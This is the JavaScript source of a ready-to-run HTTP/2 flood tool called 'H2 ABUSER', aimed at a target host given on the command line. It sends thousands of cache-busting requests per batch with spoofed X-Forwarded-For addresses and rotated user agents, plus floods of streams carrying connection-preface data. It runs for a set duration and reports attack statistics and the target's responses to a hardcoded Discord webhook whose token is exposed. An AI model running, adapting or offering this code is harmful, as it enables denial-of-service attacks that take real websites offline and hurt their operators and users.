const http2 = require('http2');
const { performance } = require('perf_hooks');
const crypto = require('crypto');

class H2Abuser {
    constructor(target, duration = 300) {
        this.target = target.replace('https://', '').replace('http://', '');
        this.duration = duration * 1000;
        this.running = true;
        
        // Stats
        this.df17Sent = 0;
        this.df17Hit = 0;
        this.loongSent = 0;
        this.loongHit = 0;
        this.destroyedReqs = 0;
        this.lastResponse = "NO RESPONSE YET";
        this.lastResponseTime = 0;
        
        // Connection pools
        this.df17Sessions = [];
        this.loongSessions = [];
        
        // User agents
        this.samsungUAs = [
            "Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S918B) AppleWebKit/537.36 Chrome/120.0.6099.210 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 Chrome/120.0.6099.210 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 Chrome/120.0.6099.210 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; SM-F936B) AppleWebKit/537.36 Chrome/120.0.6099.210 Mobile Safari/537.36",
        ];
        
        // Random IPs
        this.ips = [];
        for (let i = 0; i < 1000; i++) {
            this.ips.push(`${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`);
        }
        
        console.log(`\x1b[35m[H2 ABUSER] Starting attack on ${this.target}\x1b[0m`);
        console.log(`DF-17: 1000-1700 reqs/batch | Loong II: 4000-7000 reqs/batch`);
        console.log('='.repeat(60));
        
        this.setupConnections();
    }
    
    setupConnections() {
        // Create 3 H2 connections for each type
        for (let i = 0; i < 3; i++) {
            const df17Session = http2.connect(`https://${this.target}`);
            df17Session.setMaxListeners(100);
            df17Session.on('error', () => {});
            this.df17Sessions.push(df17Session);
            
            const loongSession = http2.connect(`https://${this.target}`);
            loongSession.setMaxListeners(100);
            loongSession.on('error', () => {});
            this.loongSessions.push(loongSession);
        }
    }
    
    randomIP() {
        return this.ips[Math.floor(Math.random() * this.ips.length)];
    }
    
    randomUA() {
        return this.samsungUAs[Math.floor(Math.random() * this.samsungUAs.length)];
    }
    
    // DF-17 Payload (Cache Buster)
    df17Request() {
        const session = this.df17Sessions[Math.floor(Math.random() * this.df17Sessions.length)];
        const cacheBuster = Math.floor(Date.now() / 1000);
        const ip = this.randomIP();
        const ua = this.randomUA();
        
        const headers = {
            ':method': 'GET',
            ':path': `/?cache_buster=${cacheBuster}`,
            ':authority': this.target,
            'user-agent': ua,
            'accept-language': 'en-US,en;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
            'cache-control': 'no-cache, no-store, must-revalidate',
            'pragma': 'no-cache',
            'x-forwarded-for': ip
        };
        
        const start = performance.now();
        const req = session.request(headers);
        
        let responseData = '';
        
        req.on('response', (headers) => {
            this.df17Hit++;
            this.lastResponseTime = Math.round(performance.now() - start);
        });
        
        req.on('data', (chunk) => {
            responseData += chunk.toString('utf8').slice(0, 200);
            if (responseData.length > 500) {
                this.lastResponse = responseData.slice(0, 500);
            }
        });
        
        req.on('end', () => {
            if (responseData) {
                this.lastResponse = responseData.slice(0, 500).replace(/\n/g, ' ').replace(/\r/g, '');
            }
        });
        
        req.on('error', () => {
            this.destroyedReqs++;
        });
        
        req.end();
        this.df17Sent++;
        
        // Clean up
        setTimeout(() => {
            req.destroy();
        }, 5000);
    }
    
    // Loong II Payload (PRI Flood)
    loongRequest() {
        const session = this.loongSessions[Math.floor(Math.random() * this.loongSessions.length)];
        
        // Special PRI payload for HTTP/2
        const priPayload = Buffer.from('PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n', 'ascii');
        
        const headers = {
            ':method': 'GET',
            ':path': '/',
            ':authority': this.target
        };
        
        const req = session.request(headers);
        
        // Send raw PRI data (simulate connection preface)
        try {
            req.write(priPayload);
        } catch {}
        
        req.on('response', () => {
            this.loongHit++;
        });
        
        req.on('error', () => {
            this.destroyedReqs++;
        });
        
        setTimeout(() => {
            req.end();
        }, 10);
        
        this.loongSent++;
        
        // Clean up
        setTimeout(() => {
            req.destroy();
        }, 1000);
    }
    
    // DF-17 Batch: 1000-1700 reqs, no delay between them
    df17Batch() {
        const count = Math.floor(Math.random() * 701) + 1000; // 1000-1700
        
        for (let i = 0; i < count; i++) {
            if (!this.running) break;
            this.df17Request();
        }
        
        console.log(`\x1b[36m[DF-17] Batch sent: ${count} reqs\x1b[0m`);
    }
    
    // Loong II Batch: 4000-7000 reqs, 50ms delay between each
    loongBatch() {
        const count = Math.floor(Math.random() * 3001) + 4000; // 4000-7000
        
        let sent = 0;
        const sendNext = () => {
            if (!this.running || sent >= count) return;
            
            this.loongRequest();
            sent++;
            
            if (sent < count) {
                setTimeout(sendNext, 50); // 50ms delay
            }
        };
        
        sendNext();
        console.log(`\x1b[31m[Loong II] Batch started: ${count} reqs (50ms delay)\x1b[0m`);
    }
    
    // Main attack loops
    startDF17() {
        const runBatch = () => {
            if (!this.running) return;
            this.df17Batch();
            const nextDelay = Math.floor(Math.random() * 2000) + 1000; // 1-3s
            setTimeout(runBatch, nextDelay);
        };
        runBatch();
    }
    
    startLoong() {
        const runBatch = () => {
            if (!this.running) return;
            this.loongBatch();
            const nextDelay = Math.floor(Math.random() * 1000) + 2000; // 2-3s
            setTimeout(runBatch, nextDelay);
        };
        runBatch();
    }
    
    // Terminal logging
    terminalLog() {
        setInterval(() => {
            console.log(`\x1b[35m────────────────────────────────────\x1b[0m`);
            console.log(`\x1b[36mDF-17   - Sent: ${this.df17Sent} | Hit: ${this.df17Hit}\x1b[0m`);
            console.log(`\x1b[31mLoong II - Sent: ${this.loongSent} | Hit: ${this.loongHit}\x1b[0m`);
            console.log(`\x1b[33mDestroyed: ${this.destroyedReqs}\x1b[0m`);
            console.log(`\x1b[35m────────────────────────────────────\x1b[0m`);
        }, 1000);
    }
    
    // Discord logging (every 30s)
    discordLog() {
        const webhook = "https://discord.com/api/webhooks/1478989089045876779/fDm39Cls5AfZ0gZJM0sbhtJt59jo3i1Oy2_aHO3GmmSUw3gdg4pDfH7niEiXiA18ZJsM";
        
        const sendUpdate = () => {
            if (!this.running) return;
            
            const totalSent = this.df17Sent + this.loongSent;
            const totalHit = this.df17Hit + this.loongHit;
            
            const embed = {
                "title": "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯",
                "color": 0x4a0e4a,
                "fields": [
                    {
                        "name": "H2 ABUSER",
                        "value": `\`\`\`Target: ${this.target}\`\`\``,
                        "inline": false
                    },
                    {
                        "name": "T-R-S",
                        "value": `\`\`\`${totalSent}\`\`\``,
                        "inline": true
                    },
                    {
                        "name": "T-H-R",
                        "value": `\`\`\`${totalHit}\`\`\``,
                        "inline": true
                    },
                    {
                        "name": "R-K-B-V",
                        "value": `\`\`\`${this.destroyedReqs}\`\`\``,
                        "inline": true
                    },
                    {
                        "name": "Target Latest Response",
                        "value": `\`\`\`${this.lastResponse}\n\nResponse Time: ${this.lastResponseTime}ms\`\`\``,
                        "inline": false
                    }
                ]
            };
            
            const https = require('https');
            const data = JSON.stringify({ embeds: [embed] });
            
            const options = {
                hostname: 'discord.com',
                path: `/api/webhooks/${webhook.split('/').slice(-2).join('/')}`,
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': data.length
                }
            };
            
            const req = https.request(options, (res) => {
                res.on('data', () => {});
            });
            
            req.on('error', () => {});
            req.write(data);
            req.end();
            
            setTimeout(sendUpdate, 30000); // 30s
        };
        
        sendUpdate();
    }
    
    // Memory management
    cleanup() {
        setInterval(() => {
            if (global.gc) {
                global.gc();
            }
            
            // Force close dead sessions
            const now = Date.now();
            this.df17Sessions = this.df17Sessions.filter(s => {
                if (!s.socket || s.socket.destroyed) {
                    try { s.destroy(); } catch {}
                    return false;
                }
                return true;
            });
            
            this.loongSessions = this.loongSessions.filter(s => {
                if (!s.socket || s.socket.destroyed) {
                    try { s.destroy(); } catch {}
                    return false;
                }
                return true;
            });
            
            // Add new sessions if needed
            while (this.df17Sessions.length < 3) {
                const s = http2.connect(`https://${this.target}`);
                s.setMaxListeners(100);
                s.on('error', () => {});
                this.df17Sessions.push(s);
            }
            
            while (this.loongSessions.length < 3) {
                const s = http2.connect(`https://${this.target}`);
                s.setMaxListeners(100);
                s.on('error', () => {});
                this.loongSessions.push(s);
            }
        }, 30000);
    }
    
    start() {
        console.log(`\x1b[32m[H2 ABUSER] Attack started on ${this.target} for ${this.duration/1000}s\x1b[0m`);
        
        this.startDF17();
        this.startLoong();
        this.terminalLog();
        this.discordLog();
        this.cleanup();
        
        setTimeout(() => {
            this.running = false;
            console.log(`\n\x1b[32m[H2 ABUSER] Attack finished\x1b[0m`);
            console.log(`DF-17: ${this.df17Sent} sent, ${this.df17Hit} hit`);
            console.log(`Loong II: ${this.loongSent} sent, ${this.loongHit} hit`);
            console.log(`Destroyed: ${this.destroyedReqs}`);
            
            // Close all sessions
            [...this.df17Sessions, ...this.loongSessions].forEach(s => {
                try { s.destroy(); } catch {}
            });
            
            process.exit(0);
        }, this.duration);
    }
}

// Run with GC enabled
if (require.main === module) {
    const target = process.argv[2];
    const duration = parseInt(process.argv[3]) || 300;
    
    if (!target) {
        console.log('Usage: node h2abuser.js <target> [duration]');
        console.log('Example: node h2abuser.js example.com 300');
        process.exit(1);
    }
    
    // Enable garbage collection
    if (global.gc) {
        console.log('\x1b[33m[GC] Enabled\x1b[0m');
    } else {
        console.log('\x1b[33m[GC] Run with --expose-gc flag for better memory management\x1b[0m');
    }
    
    const abuser = new H2Abuser(target, duration);
    abuser.start();
}
